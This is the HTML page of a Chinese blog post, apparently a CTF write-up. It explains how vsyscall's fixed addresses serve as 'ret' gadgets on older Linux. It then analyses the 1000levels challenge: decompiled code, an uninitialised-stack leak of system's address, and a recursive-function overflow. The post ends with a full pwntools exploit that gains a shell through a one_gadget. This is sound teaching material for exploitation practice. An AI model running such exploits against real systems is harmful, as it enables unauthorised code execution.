@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="manifest" href="/images/manifest.json">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-flat-top.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ikoct.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="咦!? 这都有retn用的哦 嚯嚯嚯嚯嚯嚯">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vsyscall在Pwn中的应用">
+<meta property="og:url" content="https://ikoct.com/2025/02/12/Vsyscall%E5%9C%A8Pwn%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/">
+<meta property="og:site_name" content="Ikoct的饮冰室">
+<meta property="og:description" content="咦!? 这都有retn用的哦 嚯嚯嚯嚯嚯嚯">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F02%2F12%2F20250212-154759.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F02%2F12%2F20250212-160929.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F02%2F12%2F20250212-161212.png">
+<meta property="article:published_time" content="2025-02-12T08:21:42.000Z">
+<meta property="article:modified_time" content="2025-02-12T08:21:42.368Z">
+<meta property="article:author" content="1K0CT B14s">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F02%2F12%2F20250212-154759.png">
+
+<link rel="canonical" href="https://ikoct.com/2025/02/12/Vsyscall%E5%9C%A8Pwn%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Vsyscall在Pwn中的应用 | Ikoct的饮冰室</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ikoct的饮冰室</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ikoct.com/2025/02/12/Vsyscall%E5%9C%A8Pwn%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/myavatar.gif">
+      <meta itemprop="name" content="1K0CT B14s">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ikoct的饮冰室">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Vsyscall在Pwn中的应用
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-02-12 16:21:42" itemprop="dateCreated datePublished" datetime="2025-02-12T16:21:42+08:00">2025-02-12</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" itemprop="url" rel="index"><span itemprop="name">二进制</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>咦!? 这都有retn用的哦 嚯嚯嚯嚯嚯嚯</p>
+<span id="more"></span>
+
+<h2 id="Vsyscall是什么"><a href="#Vsyscall是什么" class="headerlink" title="Vsyscall是什么?"></a>Vsyscall是什么?</h2><p>简单来说这是早期Linux系统(Ubuntu 12.04 LTS ~ Ubuntu 16.04 LTS; glibc2.15 ~ glibc2.23; 更高的版本这个机制逐渐被vDSO取代 可以手动开启)对几个系统调用做的简化机制 在程序被载入虚拟内存时会加上一段<code>Vsyscall</code> 其中有<code>gettimeofday</code>, <code>time</code>, <code>getcpu</code> 3个系统调用</p>
+<p>这几个系统调用在任何权限下都可以调用而且相比使用对应的用户态函数更快</p>
+<p>但是Vsyscall有一个致命缺陷就是这个段在虚拟内存中的地址是固定的 即使开启了PIE这几个系统调用的地址也是固定的 分别是0xffffffffff600000, 0xffffffffff600400，0xffffffffff600800</p>
+<p>同时这几个简单的系统调用不需要参数 这意味着在不对寄存器值有要求的情况下Vsyscall可以当作<code>ret</code>的下位替代 </p>
+<p>更详细的信息参考<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/19938324/what-are-vdso-and-vsyscall">这篇问答</a></p>
+<h2 id="应用举例"><a href="#应用举例" class="headerlink" title="应用举例"></a>应用举例</h2><h3 id="攻防世界-1000levels"><a href="#攻防世界-1000levels" class="headerlink" title="[攻防世界] 1000levels"></a>[攻防世界] 1000levels</h3><p>先检查一下 除了Canary保护全开</p>
+<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F02%2F12%2F20250212-154759.png" alt="image-20250212154759830"></p>
+<p>IDA看看逻辑:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. Go&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. Hint&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. Give up&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Choice:&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> num; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  sub_DDC();</span><br><span class="line">  menu();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      num = get_num();</span><br><span class="line">      <span class="keyword">if</span> ( num != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      hint();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( num == <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( num == <span class="number">1</span> )</span><br><span class="line">      guess();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong input&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_D92();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只有两个功能 先看看hint:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hint</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">264</span>]; <span class="comment">// [rsp+8h] [rbp-108h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( unk_20208C )</span><br><span class="line">    <span class="built_in">sprintf</span>(v1, <span class="string">&quot;Hint: %p\n&quot;</span>, &amp;system);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">strcpy</span>(v1, <span class="string">&quot;NO PWN NO FUN&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果<code>unk_20208C</code>非零就会泄露<code>system</code>的地址 但是交叉引用一下就会发现没有别的地方用到了这个值 正常不可能进入该分支</p>
+<p>接下来看看真正能操作的部分:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">test</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  _QWORD buf[<span class="number">4</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !test(a1 - <span class="number">1</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v6 = rand() % a1;</span><br><span class="line">  v5 = rand() % a1;</span><br><span class="line">  v4 = v5 * v6;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;====================================================&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Level %d\n&quot;</span>, a1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Question: %d * %d = ? Answer:&quot;</span>, v6, v5);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  v2 = strtol((<span class="type">const</span> <span class="type">char</span> *)buf, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> v2 == v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">guess</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 num; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+18h] [rbp-108h]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">256</span>]; <span class="comment">// [rsp+20h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many levels?&quot;</span>);</span><br><span class="line">  num = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( num &gt; <span class="number">0</span> )</span><br><span class="line">    v4 = num;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Coward&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Any more?&quot;</span>);</span><br><span class="line">  v5 = v4 + get_num();</span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt;= <span class="number">99</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You are being a real man.&quot;</span>);</span><br><span class="line">      v6 = <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s go!&#x27;&quot;</span>);</span><br><span class="line">    v2 = time(<span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( test(v6) )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = time(<span class="number">0LL</span>);</span><br><span class="line">      <span class="built_in">sprintf</span>(v7, <span class="string">&quot;Great job! You finished %d levels in %d seconds\n&quot;</span>, v6, v3 - v2);</span><br><span class="line">      <span class="built_in">puts</span>(v7);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You failed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Coward Coward Coward Coward Coward&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>要我们输入要挑战的等级数然后进行算数挑战 <code>test</code>中有足够的溢出量而且程序中链接了<code>system</code> 问题是题目开启了PIE 即使有足够的溢出量也无法调用到甚至传递参数给<code>system</code></p>
+<p>这里唯一能联想到漏洞的就是<code>guess</code>中<code>v4(qword [rbp - 0x110])</code>是有可能未定义的(第一次输入挑战次数小于1时) 这会导致<code>v4</code>可能会泄露同一个调用深度(自创的词 想不出别的形容 call语句使深度+1 ret使深度-1)的栈帧中的某个变量</p>
+<p>和<code>guess</code>在同一个调用深度的函数会是哪个呢? 再来看看比<code>guess</code>浅1层的main 不难想到不如看看<code>hint</code>吧</p>
+<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F02%2F12%2F20250212-160929.png" alt="image-20250212160929752"></p>
+<p>现在再看就会觉得题目出的有点刻晴了 如果在调用<code>guess</code>前调用了<code>hint</code> 那么这个未定义的<code>v4</code>就会泄露<code>system</code>的地址并且我们可以通过第二次输入挑战次数来改变这个值为任意的地址:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F02%2F12%2F20250212-161212.png" alt="image-20250212161212805"></p>
+<p>现在 当我们找到一个one gadget并将它与<code>system</code>的偏移在第二次输入挑战次数时输入 我们就得到了一个栈上的ROPgadget 现在唯一的问题是要如何将<code>RSP</code>移动到这个地址上并执行<code>retn</code> 这里就用到了上面介绍的Vsyscall 只要用这个当作<code>retn</code>在test最后一次被调用(此时调用深度为guess的+1)时从<code>[rbp + buf]</code>开始一直覆盖到<code>guess</code>的栈帧直到我们的one gadget(也可以提前覆盖 test是递归调用的 调用深度会很深 需要覆盖的栈帧会比较多 溢出量不一定够用 直接从最后一次开始覆盖用到的溢出量会少一点)</p>
+<p>这里给出exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./100levels&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;61.147.171.105&#x27;, 53943)</span></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">20000</span>)</span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">l64     = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l32     = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line">bias = one_gadget - system</span><br><span class="line">sla(<span class="string">b&#x27;Choice:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Choice:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;levels?&#x27;</span>, <span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;more?&#x27;</span>, <span class="built_in">str</span>(bias).encode())</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;Question: &#x27;</span>)</span><br><span class="line">    q = ru(<span class="string">b&#x27; =&#x27;</span>).decode().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(q)</span><br><span class="line">    ans = <span class="built_in">int</span>(q[<span class="number">0</span>]) * <span class="built_in">int</span>(q[<span class="number">2</span>])</span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line">    sla(<span class="string">b&#x27;Answer:&#x27;</span>, <span class="built_in">str</span>(ans).encode())</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span> + <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line">Vsyscall = p64(<span class="number">0xffffffffff600400</span>)</span><br><span class="line">payload = padding + Vsyscall * <span class="number">3</span></span><br><span class="line">sa(<span class="string">b&#x27;Answer:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Pwn/" rel="tag"># Pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/02/05/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E9%80%86%E5%90%91%E6%89%8B%E5%85%A5%E9%97%A8Web3%E7%94%9F%E6%B4%BB/" rel="prev" title="从零开始的逆向手入门Web3生活">
+      <i class="fa fa-chevron-left"></i> 从零开始的逆向手入门Web3生活
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
